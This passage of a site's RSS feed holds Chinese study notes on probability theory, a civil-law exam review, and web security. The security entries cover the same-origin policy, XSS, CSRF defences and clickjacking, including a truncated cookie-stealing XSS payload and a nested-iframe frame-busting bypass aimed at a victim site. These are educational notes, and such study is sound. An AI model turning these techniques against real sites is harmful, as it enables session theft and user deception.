$$k \in {0, 1, &amp;hellip;, n}, 0 \lt p \lt 1, q = 1-p$$ $$np$$ $$npq$$ 泊松分布 $$X \sim P(\lambda)$$ $${\displaystyle P(X = k) = \frac{\lambda^k}{k!</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%9A%8F%E6%9C%BA%E8%BF%87%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%9A%8F%E6%9C%BA%E8%BF%87%E7%A8%8B/</guid><description>随机过程 # 定义 # 随机过程（Stochastic Process）的定义：
设随机试验 E 的样本空间 $$S \in {\xi}$$ 若对于每个元素 $$\xi \in S$$ 总有一个确知的时间函数 $$X(t, \xi) t \in Ts,$$ 与它对应，对于所有的，就可以得到一簇时间 t 的函数，称它为随机过程。簇中的每一个函数称为样本函数。 若对于每个特定的时间 $$t_i(i = 1,2,&amp;hellip;)$$，都是随机变量，则称 $$X(t, \xi)$$ 为随机过程，$$X(t_i, \xi)$$称为随机过程 $$X(t)$$ 在 $$t = t_i$$ 时刻的状态。 即有：
$$X(t, \xi)$$ t 固定 t 可变 $$\xi $$ 固定 确定值 时间函数 $$\xi $$ 可变 随机变量 随机过程 概率分布 # 一维概率分布 # 记 $$F(x_i; t_i) = P(X(t_i) \le x_i )$$ 为随机过程 $$X(t)$$ 的一维分布函数。若 $$F(x, t)$$ 的偏导数存在，则有 $$\displaystyle f_X(x_i, t_i) = \frac{\part F_X(x_i, t_i)}{\part x_i}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%A2%98%E7%9B%AE%E7%B2%BE%E8%A7%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%A2%98%E7%9B%AE%E7%B2%BE%E8%A7%A3/</guid><description>题目 # 判断题 # 1 # 设有分布律 $${\displaystyle P(X = (-1)^{n+1} \frac{2^n}{n}) = \frac{1}{2^n}}$$，则 X 的数学期望存在。
错误。
数学期望定义：
设离散型随机变量 X 的分布律为：$$P(X = x_k) = p_k$$
若级数 $${\displaystyle \sum_{k=1}^{\infin} x_k p_k}$$ 绝对收敛，则称 $${\displaystyle \sum_{k=1}^{\infin} x_k p_k}$$ 的和为随机变量 X 的数学期望，记为 $$E(X)$$
即有：$$E(X) = {\displaystyle \sum_{k=1}^{\infin} x_k p_k}$$
设连续型随机变量 X 的概率密度为 f(x)
若积分 $${\displaystyle \int_{-\infty}^{\infty} x f(x) dx}$$ 绝对收敛，则称积分 $${\displaystyle \int_{-\infty}^{\infty} x f(x) dx}$$ 的值为随机变量 X 的数学期望，记为 $$E(X)$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%B0%91%E6%B3%95%E6%80%BB%E8%AE%BA/%E6%B0%91%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%B0%91%E6%B3%95%E6%80%BB%E8%AE%BA/%E6%B0%91%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</guid><description>民法总论期末复习 # 第一章 导论 # 第3节 民法的本质 # 民法的基本原理，私法自治原则。 私法自治，也称意思自治，指经济生活和家庭生活中一切民事权利义务关系的设立、变更和消灭，均有当事人自己决定，一般国家不作干预。 私法自治的功能：(1)排除个人束缚; (2)废除特权; (3)保障私有财产; (4)维护个人自由、尊严。 私法自治原则的限制 第4节 民法的本位 # 近代民法为权利本位：法律之基本任务，由使人尽其义务保护权利，为使权利之内容得以实现，方有义务之履行，是为权利本位。其体现在近代民法三大原则之中： 契约自由原则 所有权绝对原则 自己责任原则 社会本位：为使社会共同生活之增进，法律即强使人负担特定之义务，限制或剥夺其某种权利，此为私法自治之限制，是为社会本位。 契约自由的限制 所有权绝对原则之限制 无过错责任原则之采用 第5节 民法的基本原则 # 中国民法的基本原则 平等原则：指在民事活动中一切当时人法律地位平等，任何一方不得把自己的意志强加给对方。 基本含义：给予他人以相同对待；尊重对方的主体性。 具体表现：民事主体的资格平等；民事主体的地位平等；民事主体的民事权益平等的受法律保护。 合同自由原则：指参加民事活动的当事人在法律允许的范围内享有完全的自由，按照自己的自由意思决定缔结合同关系，为自己设定权利或对他人承担义务，任何机关、组织和个人不得非法干预。 公平原则：指法律行为内容的确定，应当遵循公平的原则。公平原则的体现 权利与义务的平衡 行为与责任的平衡 收益与风险的平衡 利益与贡献的平衡 诚实守信原则：指民事主体在进行民事活动时，应诚实不欺、恪守诺言，并且合理、善意的方式行使权利、履行义务。 公序良俗原则：是指民事主体的行为应遵守公共秩序，符合善良风俗，不得违法国家的公共秩序和社会的一般道德。违反公序良俗的具体表现有： 危害国家 危害家庭关系 违反性道德的行为 射幸行为（所谓射幸合同是指当事人一方是否履行义务有赖于偶然事件的出现的一种合同） 违反人权和人格尊严的行为 限制经济自由的行为 违反公平竞争的行为 违反消费者保护的行为 违反劳动者保护的行为 暴利行为 权利滥用之禁止行为：指一切民事权利之行使，不得超过其正当界限致有损他人利益或社会公益，行使权利超过七正当界限，则构成权利滥用，应当承担民事责任。 权利滥用的构成的条件：有权利的存在，有行使权利的行为，有滥用权利的违法性（即对他人造成了不当损害） 主观方面：权利人的主观目的主要是为了损害他人；客观方面：权利人的行为产生损害他人利益的行为。 第6节 民法与邻近法律部门 # 法律体系： 财产权： 债权：合同、侵权行为、无因管理、不当得利 物权：所有权、他物权（用益物权、担保物权） 知识产权：著作权、工业产权（商标权、专利权（发明、使用新型、外观设计））、其他 人身权： 人格权： 一般人格权：给予人格独立、自由、平等和尊严这些一般人格利益而享有的权利 具体人格权（生命权、健康权、身体权、姓名权、肖像权、名誉权） 身份权： 亲属法上的身份权：亲权、亲属权、配偶权 非亲属法上的身份权：荣誉权 第二章 民事法律关系 # 第2节 民事法律关系的要素 # 民事法律关系的构成：主体、客体、内容 民事法律关系的主体：指参与民事法律关系享有民事权利承担民事义务的法律资格，或指享有民事权利能力的人。 民事法律关系的客体：指民事法律关系的主体享有的权利和承担的义务所指向的事物。 民事法律关系的内容：指民事法律关系的主体所享有的民事权利和负有的民事义务。 民事法律关系的事实：民事法律事实，指依法能够引起民事法律关系发生、变更、消灭的客观情况。 根据是否与人的意志有关，可将民事法律事实区分为自然事实与行为。 第3节 民事能力 # 民事权利能力的概念：根据以充当民事主体，享受民事权利和承担民事义务的法律地位或法律资格。 民事行为能力：指民事主体根据以独立参加民事法律关系，以自己的法律行为取得民事权利或承担民事义务的法律资格。 意思能力：指自然人认识自己的行为的动机与结果，并根据此认识决定其正常的意思之能力。意思能力为法律赋予自然人民事行为能力之前提。 民事责任能力：指民事主体据以独立承担民事责任的法律地位或法律资格 民事行为能力与民事责任能力比较： 目的不同，民事行为能力的目的在于使主体可以按照自己的意思追求自身利益，民事责任能力的目的则在于对主体的违法行为追究民事责任，保护他人和社会利益； 效力不同，民事行为能力为决定民事法律行为是否有效的根据，民事责任能力为决定主体是否自己承担民事责任的根据； 性质不同，民事行为能力是具体的，有一定范围；民事责任能力是抽象的，无一定范围。 第4节 民事权利 # 民事权利的特点 民事权利是一种由民法确定的权利； 民事权利是由民事主体享有的一种权利； 民事权利体现为民事主体一定范围内的行为自由； 权利在性质上是一种法律之上的力； 权利是类型化的利益。 权利的分类 根据：公权、私权。 标的：财产权（可以与权利人的人格、身份相分离而具有财产价值的权利）、非财产权。 作用：支配权、请求权、形成权（指当事人一方依据自己的行为，是自己与他人法律关系发生变动的权利。形成权的行使不得附条件或附期限，其行使不得撤销）、抗辩权（权利人用以对抗他人请求权或否认对方权利主张的权利） 效力所及范围：绝对权（对世权）、相对权（对人权） 相互关系：主权利、从权利 与权利主体关系：专属权、非专属权 是否具备全部成立条件：既得权、期待权 民事权利的取得 民事权利的原始取得：指民事权利独立地、不依附与既存之其他权利而发生 民事权利的继受取得：基于他人既存权利而发生权利，或称为民事权利的传来取得。分为转移的继受取得与设定的继受取得。 民事权利的变更 民事权利主体之变更 民事权利内容之变更 民事权利的消灭：分为绝对消灭与相对消灭 民事权利的保护： 民事权利的自我保护，或称为民事权利的私力救济：指权利人自己采取各种合法手段来保护自己的权利不受侵犯。包括：正当防卫、紧急避险、自助行为。 民事权利的国家保护，又称公力救济：指权利受到侵犯是，由国家机关给予保护。确认之诉、给付之诉、形成之诉。 权利竞合 第6节 民事责任 # 民事责任的本质： 民事责任为民事法律构成之要素 民事责任使民事权利具有法律之上的力 民事权利是连接民事权利与国家公权力之中介 民事责任是一种特别债 民事责任与其他法律责任的区别 内容 民事责任 其他责任 产生根据 法定或约定 法定 法律强制程度 权利人自主决定追究或免除 由国家机关强制追究，非经法定程序不得免除 目的和性质 以填补损害为目的，补偿性 以预防为目的，具有惩罚性 构成要件 既有过错责任也有非过错责任 责任人均须有过错 → 一般要求损害事实发生 不要求实际损害发生 → 存在替代责任 责任自负 一些责任的概念： 共同责任：可以分为按份责任、连带责任和补充责任 按份责任：指多数当事人按照法律的规定或者合同的约定各自承担一定份额的民事责任，各责任人之间没有连带关系。 连带责任：因违反连带债务或者共同事实侵权行为而产生的责任，各个责任人之间具有连带关系。 补充责任：指责任人的财产不足以承担其应负的民事责任时，有有关的人对不足的部分依法语义补充的责任。 不真正连带责任：指各债务人基于不同的发生原因而对于同一债权人负有以同一给付为标的的数个债务，因一个债务人的履行而使全体债务均归于消灭，此时数个债务人之间所负的责任即为不真正连带责任。 第3章 民事主体（自然人） # 第2节 人格权 # 人格权：指存在于权利人自身人格上的权利，亦即以权利人自身的人格利益为标的之权利。人格权不得转让与放弃。 第3节 民事行为能力 # 民事行为能力：自然人能以自己的行为享有民事权利、承担民事义务的资格。 完全民事行为能力：自然人具有的完全独立地通过自己的行为取得民事权利和承担民事义务的资格。包括： 18周岁以上的成年人 16周岁以上不满18岁，以自己的劳动收入为主要生活来源，并能维持当地群众一般生活水平的自然人 限制民事行为能力：指自然人具有的可以通过自己的行为取得部分民事权利和承担部分民事义务的资格。限制民事行为能力人，可以进行与其年龄、智力或精神健康状况相适应的民事活动；其他民事活动由其法定代理人代理，或者征得其法定代理人的同意。包括： 10周岁以上的未成年人 不能完全辨认自己行为的精神病人（包括痴呆人） 无民事行为能力：指自然人不具有自己的行为取得民事权利和承担民事义务的资格。无民事行为能力人的民事行为，应由其法定代理人进行。包括如下两类自然人。包括： 不满10周岁的未成年人； 不能辨认自己行为的精神病人。 第4节 监护 # 监护：指为无民事行为能力人和限制民事行为能力人设置保护人，以监督和保护其人身、财产以及其他合法权益的制度。监护特点如下： 被监护人只能是无民事行为能力人和限制民事行为能力人。 监护人只能是完全民事行为能力人和有监护条件的组织。 监护的目的，在于弥补无民事行为能力人和限制民事行为能力人在民事行为方面的不足或缺陷。 协议监护与委托监护 协议监护，是指由有监护资格的人协商确定监护人的监护。有监护资格的人之间协议确定监护人的，应当由协议确定的监护人对被监护人承担责任。 委托监护，是指监护人将监护职责委托给他人所产生的监护。监护人可以将监护责任部分或全部委托给他人。因被监护人的侵权行为需要承担民事责任的，应当由监护人承担，但当事人另有约定的除外。只有在被委托人确有过错的情况下，才负连带责任。 第5节 宣告失踪制度 # 宣告失踪：指经利害关系人申请，由法院对下落不明满一定期限的自然人宣告为失踪人的制度。 宣告失踪的条件，法律后果，撤销 第6节 宣告死亡制度 # 宣告死亡：指自然人下落不明达到法定期限，经利害关系人申请，由法院宣告其死亡的制度。 宣告死亡的条件，法律后果，撤销。 第4章 民事主体（法人） # 第1节 法人的概念 # 法人：是指具有民事权利能力和民事行为能力，依法独立享有民事权利和承担民事义务的组织。法人的民事权利能力和民事行为能力，从法人成立时产生，到法人终止时消灭。 法人的特征： 独立的组织。法人的民事主体资格与组成法人的自然人的民事主体资格彼此独立，某个或某些法人成员的死亡或退出法人组织，不影响法人的存续；法人的组织无需依靠其他组织或单位而独立存在。 独立的财产。法人所有或经营管理的全部财产独立于其出资者的其他财产，法人享有独立财产权。 独立的责任。法人以自己的名义进行民事活动，独立享有民事权利承担民事义务。如果法人违反民事义务，由法人独立承担民事责任。法人的财产不足以清偿债务时，法人出资者一般不承担责任。 第4节 法人的民事能力 # 法人的民事权利能力：是指法人以自己的名义独立享受民事权利和负担民事义务的资格。具有如下特点： 法人的民事权利能力始于成立、终于消灭。 法人民事权利能力受法人自然属性的限制。法人是社会组织，具有团体性，因而法人不享有自然人基于自然属性所享有的权利，如生命权、健康权等，当然法人也不可能享有婚姻能力等。 法人的民事权利能力受法人宗旨的限制，但除国家限制经营、特许经营和禁止经营外，法人超越其经营范围的民事行为并非一定无效。 法人的民事行为能力：是指法人通过自己的行为取得民事权利和承担民事义务的资格。具有如下特点： 法人的民事行为能力，与其民事权利能力同时产生、同时消灭，在存续时间上具有一致性。 法人的民事行为能力，与其民事权利能力在范围上具有一致性。 法人的民事行为能力，是通过法定代表人和其他法人机关成员来实现的。 代表说与代理说 法人的民事责任能力：是指法人对自己所为的违法行为承担法律责任的能力或资格。具有如下特点： 法人的责任能力与法人的权利能力同时产生、同时消灭，而且其范围是一致的。 法人，只对法定代表人、法人机关及工作人员在其权利能力范围内所为职务违法行为承担民事责任。法人的责任能力，包括法人的违约责任能力和法人的侵权责任能力。 法人承担法律责任需满足以下要件：须有加害他人的侵权行为；须因法人的代表人或其他工作人员的行为；须因执行职务的行为所发生。 第6章 法律行为 # 第1节 法律行为的概念 # 法律行为：又称民事行为，是指民事主体实施的以发生民事法律后果为目的、以意思表示为要素的行为。 法律行为的分类 意思表示状况：双方行为、单方行为和多方行为。 依据法律是否须依法律规定的特定方式为之：要式行为、不要式行为。 依据法律行为的成立除意思表示外，是否以标的物的实际交付为要件：要物行为、不要物行为。 发生效力时间：生前行为、死因行为。 法律后果性质：财产行为、身份行为。 财产行为效果的不同：负担行为、处分行为。 法律行为内容的不同：债权行为、物权行为。 法律行为是否有对价：有偿行为、无偿行为。 行为之间的关系：主行为、从行为。 法律行为是狗有独立的实质内容：独立行为、补助行为。 行为和原因之间的关系：有因行为、无因行为。 第3节 法律行为的要件 # 法律行为的成立要件：包括一般成立条件和特别成立条件 一般成立条件：任何法律行为成立都必不可少的共同要件。包括： 须有行为人 须有意思表示。意思+表示 须有标的。标的即表示的内容，是行为人实施法律行为所要达到的效果。 特别成立条件，指一些特别的法律行为成立所须具备的特殊条件。 法律行为的生效要件，包括一般生效要件和特别生效要件 一般生效要件： 行为人具有相应的民事行为能力； 意思表示真实； 标的须合法； 标的须可能和确定。 特别生效要件，是指一些特殊的法律行为除具备一般生效要件外，还须具备的生效要件。 法律行为的标的：是指法律行为的内容。法律行为的成立，以有标的为成立要件。包括： 标的合法，是指不违反法律强行性规定及公序良俗。 标的确定，是指标的须自始确定。否则无效。 第4节 意思表示 # 意思表示：指向外部表明意欲发生一定私法上的法律效果之意思的行为。 意思表示的构成要素：效果意思、表示意思和表示行为。 效果意思：指表示上的效果意思，即从书面形式或口头形式的表示行为所推断出的效果意思。 表示行为：指以书面形式或口头形式将意思外部化的行为。 第5节 意思与表示不一致 # 故意的不一致 真意保留：指表意人故意隐匿其真意，而表示与其真意不同之意思的意思表示。 须有意思表示 须表示与真意不符 须表意人明知其表示与真意不符 真意保留原则上有效，但其不一致为相对人所明知者，应无效。 虚伪表示：指表意人与相对人通谋而为之虚假的意思表示。 须有意思表示 须表示与真意不符 须表意人与相对人通谋 虚伪表示原则上无效，但不得以其无效对抗善意第三人。 隐藏行为:指隐藏于虚伪表示中依其真意所欲发生的法律行为。 脱法行为:指以迂回手段规避强行规定之行为。 无意的不一致 错误:指表意人因误认或不知，致其意思与表示不一致。 错误的意义: 须表示与意思不一致 须其不一致出于表意人之误认或不知 错误的分类 关于当事人本身的错误 关于标的物本身之错误 关于当事人资格之错误 关于标的物性质之错误 关于法律行为性质之错误 关于价格、数量、履行地、履行期之错误 关于动机之错误 错误的效力:日本民法规定为无效；德国、台湾民法规定为可撤销。 误传:指因传达人或传达机关之错误致表示与意思不符。传达人和传达机关在法律上相当于表意人之喉舌，因此误传之效力与错误同。 胁迫:指以不法加害威胁他人，使其产生恐惧心理，并基于恐惧心理而为意思表示之行为。 胁迫的构成要件 须有胁迫之故意 须有胁迫行为 须其胁迫为非法 须被胁迫人因受胁迫而生恐惧心理 须被胁迫人基于恐惧心理而为意思表示 胁迫的效力:不论胁迫人是否为对方当事人，表意人均得撤销其意思表示，并且此撤销得对抗善意第三人。 第7章 代理 # 第1节 代理的概念 # 代理：指一人代另一人为法律行为，其所产生的法律效果直接归属所带的另一个人。 狭义代理：指代理人以本人名义为法律行为，而使其法律效果直接归属于本人。 广义代理：代理人以本人名义或以自己名义，代本人为法律行为，而使所产生的法律效果直接或间接归属于本人。 第2节 代理关系 # 本人：指借助于代理人的代理行为同相对人发生民事法律关系的人。 代理人：指代本人实施民事法律行为的人。 相对人：指由代理人的代理行为而与本人发生民事法律关系的对方当事人。 第5节 代理行为 # 代理行为的成立要件 一般成立要件 特殊成立要件 是否以本人名义 须代理人实施民事法律行为 代理行为的生效要件 须具备一般民事的生效要件 关于权利能力之有无，应就本人决定之。 关于行为能力之有无，应就代理人决定之。 关于意思表示之是否真实，是否有瑕疵，应就代理人决定之。 关于行为内容和目的是否违法，应就代理人与本人双方决定之。只要其中一方有违法目的，代理行为即应无效。 须有本人存在 须有代理权 第8章 诉讼时效 # 第1节 时效的概念 # 时效，指一定事实状态在法定期间持续存在，从而产生与该事实状态相适应的法律效果的法律制度。民法关于时效的规定，属于强行性规定，构成民事权利的限制。 时效制度的重大功能 稳定法律秩序 作为证据之代用 促使权利人行使权利 第4节 诉讼时效的期间 # 民法通则规定了三种时效期间，即普通时效期间为2年，特别时效期间为1年，最长时效期间为20年。 诉讼时效期间的中止:指在时效期间行将完成之际，有与权利人无关的事由而使权利人无法行使其请求权，法律为保护权利人而使时效期间暂停计算，待中止事由消灭后继续计算。 时效期间中止的条件 有权利人不能行使其请求权的障碍，包括不可抗力及其他障碍。 此障碍发生在2年的普通时效期间或1年的特别时效期间的最后6个月内。 诉讼时效期间的中断:中断，指在有法定事由发生时，此前已计算的时效期间全归无效，待中断事由消灭后时效期间重新计算。 时效期间中断的法定事由 起诉 以其他方式主张权利 义务人同意履行义务 中断与中止的区别： 发生中止的原因属于与当事人无关的客观情况，而发生中断的原因系当事人的行为，亦即取决于当事人的意思。 在时效期间中止，中止以前已经进行的时效期间为有效，应与中止原因消灭后继续计算的时效期间合并计算；在时效期间中断，中断以前已经进行的时效期间为无效，中断原因消灭后重新计算时效期间。 在时效期间中止，中止原因应发生在时效期间的最后6个月内，才能发生中止的效力；在时效期间中断，中断原因无论发生在时效期间的哪一段，均应发生中断的效力。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/</guid><description>浏览器安全 # 同源策略 # 什么是同源策略（Same Origin Policy）？
浏览器的同源策略，限制了来自不同源的 document 或脚本之间的读取访问。 源的因素有很多种：域名与子域名、IP 地址、端口、协议。
src 属性资源文件的加载：
需要注意的是，存放 JS 文件的域并不重要；重要的是 JS 文件加载的域。
在浏览器中 &amp;lt;script&amp;gt;、&amp;lt;img&amp;gt;、&amp;lt;iframe&amp;gt;、&amp;lt;link&amp;gt; 等标签都可以被跨域加载资源，而不受同源策略的限制。
这些带 src 属性的标签每次加载时，实际上是由浏览器发起了一次 GET 请求。
不同于 XMLHttpRequest 的是：通过 src 属性加载的资源，浏览器限制了其权限（不能读写返回的内容）。
XMLHttpRequest 请求：
如果 XMLHttpRequest 能够跨域访问资源，则可能会导致一些敏感资源的泄露。比如：CSRF 的 token，从而导致发生安全问题。
随着业务的发展，W3C 委员会制定了 XMLHttpRequest 跨域访问标准：它需要通过目标域返回的 HTTP 头来授权是否允许跨域访问。
安全性基于：因为 HTTP 请求头一般是无法被 JS 控制的，所以认为这个方案是可以实施的。
对于浏览器来说，除了 DOM、Cookie、XMLHttpRequest 会受到同源策略的限制外，浏览器加载的一些第三方插件也有各自的同源策略。最常见的比如：Flash、Java Applet、Silverlight、Google Gears 等都有自己同源策略。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss/</guid><description>跨站脚本攻击（XSS） # OWASP TOP 10 威胁曾多次把 XSS 列在榜首。
XSS 简介 # 跨站脚本攻击：
Cross Site Script (XSS)。通常指黑客通过 HTML 注入的方式篡改了网页、插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。 XSS 根据效果不同可以分为如下几类：
反射型 XSS，或称 “非持久型 XSS”（Non-persistent XSS）。只是简单地把用户的输入 “反射” 给浏览器。 存储型 XSS，或称 “持久型 XSS”（Persistent XSS）。会把用户输入的数据 “存储” 在服务端，这种 XSS 具有很强的稳定性。 DOM Based XSS。这种 XSS 从效果上来看也属于反射型 XSS。与后者的区别是通过更改 DOM 树的方式而非执行 JavaScript 代码的方式进行攻击。 XSS Payload # 窃取 Cookie # 最常见的 XSS Payload 就是读取浏览器的 cookie 对象：
var img = document.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/3.%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/3.%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf/</guid><description>跨站点请求伪造 CSRF # CSRF: Cross Site Request Forgery
CSRF 的防御 # 验证码 # CSRF 攻击的过程，往往是在用户不知情的情况下构造了网络请求。因此在通常情况下，验证码能够很好地遏制 CSRF 攻击。
但是验证码并非万能。很多时候，处于用户体验考虑，网站并不能给所有的操作都加上验证码。
Refer Check # Refer Check 在互联网中最常见的应用就是防止图片盗链：
盗链：服务商自己不提供服务的内容，通过技术手段绕过其它有利益的最终用户界面（如广告），直接在自己的网站上向最终用户提供其它服务提供商的服务内容，骗取最终用户的浏览和点击率。 通过同样的原理，Refer Check 也可以用于检查请求是否来自合法的 “源”。
即使我们能够通过检查 Refer 是否合法来判断用户是否被 CSRF 攻击，也仅仅是满足了防御的充分非必要条件。Refer Check 的缺陷在于，服务器并非任何时候都能取到 Refer。很多时候处于隐私考虑、或者是浏览器限制了 Refer 的发送。
因此我们无法依赖 Refer Check 作为防御 CSRF 的主要手段。但是我们可以用它监控 CSRF 攻击的发生。
Anti CSRF Token # CSRF 为什么可以攻击成功呢？
其本质原因是，重要操作的所有参数都是可以被攻击者猜测的。攻击者只有预测除了 URL 的所有参数与参数值，才能成功地构造一个伪造的请求。 处于这个原因我们可以使用一些随机数把参数加密，使攻击者无法猜测到参数值。 这种方式就叫做 Anti CSRF Token。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/4.%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81clickjacking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/4.%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81clickjacking/</guid><description>点击劫持 Click Jacking # 防御 Click Jacking # frame busting # 通常可以写一段 JavaScript 代码，以禁止 iframe 的嵌套。这种方法叫做 frame busting。比如：
if (top.location != location) top.location = self.location 但是这种方法也存在一些缺陷，因为它是用 JavaScript 写的，控制能力并不是特别强，因此有许多方法可以绕过它。比如上面的方法就可以用嵌套多个 iframe 的方法绕过：
Attacker top frame: # 自学笔记 (pdf) &amp;lt;iframe src=&amp;#34;attacker2.html&amp;#34;&amp;gt; Attacker sub-frame: &amp;lt;iframe src=&amp;#34;http://victim.com&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;/iframe&amp;gt; X-Frame-Options # 因为 frame busting 存在被绕过的可能，所以我们需要更好的方法。一个比较好的方案是使用一个 HTTP 请求头——X-Frame-Options，这个请求头可以说是为了解决 Click Jacking 而生的。
当这个值为 DENY 时，浏览器会拒绝当前页面加载任何 frame 页面；
若值为 SAMEORIGIN 时，则可以定义允许 frame 加载的页面地址。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/5.html5%E5%AE%89%E5%85%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/5.html5%E5%AE%89%E5%85%A8/</guid><description>HTML5 安全 # 佘崧林认为这已经是一个过时的概念了。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</guid><description>注入攻击 # Akamai 在 2019 年研究表明 65.1% 的 Web 